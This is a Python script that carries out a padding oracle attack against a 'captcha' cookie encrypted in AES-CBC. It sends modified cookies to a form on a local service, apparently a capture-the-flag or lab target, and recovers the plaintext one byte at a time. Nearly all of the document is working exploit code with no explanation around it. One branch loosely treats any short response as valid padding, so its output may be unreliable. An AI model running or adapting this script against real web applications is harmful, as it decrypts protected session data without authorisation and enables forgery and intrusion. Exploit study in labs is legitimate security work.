import base64
import requests
import time

# Configuration
base_url = "http://127.0.0.1:32834"
cookie_name = "captcha"
target_cookie = "2mArom13+gd4q/dQTQu4aFVpwOkejaqPtWuV0Kyn2ls="

# Decode the base64 cookie
cookie_bytes = base64.b64decode(target_cookie)
BLOCK_SIZE = 16
blocks = [cookie_bytes[i:i+BLOCK_SIZE] for i in range(0, len(cookie_bytes), BLOCK_SIZE)]

print(f"[+] Starting padding oracle attack")
print(f"[+] Cookie has {len(blocks)} blocks")

def make_request(modified_cookie):
    """Make a request with modified cookie and return response text"""
    try:
        session = requests.Session()
        session.cookies.set(cookie_name, modified_cookie)
        
        # Submit registration form with dummy data
        data = {
            'username': 'testuser',
            'captcha': 'test',
            'submit': 'Submit'
        }
        
        resp = session.post(base_url, data=data, timeout=5)
        return resp.text
    except Exception as e:
        return f"Error: {e}"

def padding_oracle_attack(iv, ciphertext):
    """Perform padding oracle attack on a single block"""
    decrypted = bytearray(BLOCK_SIZE)
    
    for byte_pos in range(BLOCK_SIZE - 1, -1, -1):
        print(f"\n[+] Decrypting byte position {byte_pos}")
        
        # Create the prefix we'll modify (for single block, IV is used)
        prefix = bytearray(iv)
        
        # Set the padding bytes we already know
        for i in range(byte_pos + 1, BLOCK_SIZE):
            prefix[i] = iv[i] ^ decrypted[i] ^ (BLOCK_SIZE - byte_pos)
        
        # Try all possible values for current byte
        found = False
        for guess in range(256):
            # Set the byte we're trying to guess
            prefix[byte_pos] = iv[byte_pos] ^ guess ^ (BLOCK_SIZE - byte_pos)
            
            # Create the modified cookie
            full_cookie = prefix + ciphertext
            encoded_cookie = base64.b64encode(full_cookie).decode()
            
            # Make request
            response = make_request(encoded_cookie)
            
            # Check if valid padding (not a padding error)
            if "Invalid CAPTCHA!" in response:
                # This is NOT a padding error - CAPTCHA invalid means padding was valid
                decrypted[byte_pos] = guess
                print(f"  [+] Found byte {byte_pos}: {hex(guess)} ('{chr(guess)}')")
                found = True
                break
            elif "Error" not in response and len(response) < 100:
                # Some other response - might be valid
                decrypted[byte_pos] = guess
                print(f"  [+] Found byte {byte_pos}: {hex(guess)} ('{chr(guess)}')")
                found = True
                break
        
        if not found:
            print(f"  [-] Could not decrypt byte {byte_pos}")
            decrypted[byte_pos] = 0
    
    return bytes(decrypted)

# For our cookie with 2 blocks:
# Block 0 is IV, Block 1 is the actual data
iv = blocks[0]
ciphertext = blocks[1]

print(f"\n[*] Starting attack on block 1 using block 0 as IV")
print(f"[*] IV: {iv.hex()}")
print(f"[*] Ciphertext: {ciphertext.hex()}")

decrypted_block = padding_oracle_attack(iv, ciphertext)
print(f"\n[+] Decrypted block result: {decrypted_block.hex()}")

# Try to decode as text
try:
    decrypted_text = decrypted_block.decode('latin-1')
    print(f"[+] Decrypted text (latin-1): {repr(decrypted_text)}")
    
    # Try common encodings
    try:
        print(f"[+] Decrypted text (utf-8): {decrypted_block.decode('utf-8')}")
    except:
        pass
        
    try:
        print(f"[+] Decrypted text (ascii): {decrypted_block.decode('ascii', errors='replace')}")
    except:
        pass
        
except Exception as e:
    print(f"[-] Could not decode: {e}")

# Print each byte with its character representation
print("\n[+] Byte-by-byte analysis:")
for i, byte in enumerate(decrypted_block):
    char = chr(byte) if 32 <= byte <= 126 else '.'
    if byte == 0:
        char = '<NULL>'
    elif byte >= 128:
        char = f'<{byte:02x}>'
    print(f"  Byte {i:2d}: 0x{byte:02x} '{char}'")

# Try to extract printable characters
printable_chars = ''.join(chr(b) if 32 <= b <= 126 else '' for b in decrypted_block)
print(f"\n[+] Printable characters: '{printable_chars}'")
